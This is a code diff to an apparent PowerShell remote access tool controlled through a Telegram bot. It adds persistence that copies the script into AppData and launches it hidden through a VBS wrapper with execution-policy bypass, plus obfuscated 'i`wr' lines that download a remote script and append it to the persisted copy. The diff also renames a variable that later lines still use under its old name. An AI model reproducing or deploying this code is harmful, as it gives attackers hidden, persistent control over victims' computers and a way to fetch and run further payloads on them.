@@ -30,7 +30,7 @@ if ($latestUpdate.message -ne $null){$chatID = $latestUpdate.message.chat.id;Wri
 $MessageToSend = New-Object psobject 
 $MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID
 # Collect script contents
-$scriptContent = Get-Content -path $MyInvocation.MyCommand.Name -Raw
+$scriptDirectory = Get-Content -path $MyInvocation.MyCommand.Name -Raw
 #----------------------------------------------- ON START ------------------------------------------------------
 # Message waiting for passphrase
 $contents = "$comp $env:COMPUTERNAME $waiting Waiting to Connect.."
@@ -405,6 +405,13 @@ Function AddPersistance{
 $newScriptPath = "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"
 $scriptContent | Out-File -FilePath $newScriptPath -force
 sleep 1
+if ($newScriptPath.Length -lt 100){
+    "`$tg = `"$tg`"" | Out-File -FilePath $newScriptPath -Force
+    "`$gh = `"$gh`"" | Out-File -FilePath $newScriptPath -Append
+    i`wr -Uri "$parent" -OutFile "$env:temp/temp.ps1"
+    sleep 1
+    Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
+    }
 $tobat = @'
 Set objShell = CreateObject("WScript.Shell")
 objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%\Microsoft\Windows\PowerShell\copy.ps1""", 0, True
@@ -427,7 +434,12 @@ $params = @{chat_id = $ChatID ;text = $contents}
 Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
 $newScriptPath = "$env:APPDATA\Microsoft\Windows\temp.ps1"
 $scriptContent | Out-File -FilePath $newScriptPath -force
-
+if ($newScriptPath.Length -lt 100){
+    "`$tg = `"$tg`"" | Out-File -FilePath $newScriptPath -Force
+    "`$gh = `"$gh`"" | Out-File -FilePath $newScriptPath -Append
+    i`wr -Uri "$parent" -OutFile "$env:temp/temp.ps1"
+    Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
+    }
 $tobat = @'
 Set objShell = CreateObject("WScript.Shell")
 objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%\Microsoft\Windows\temp.ps1""", 0, True
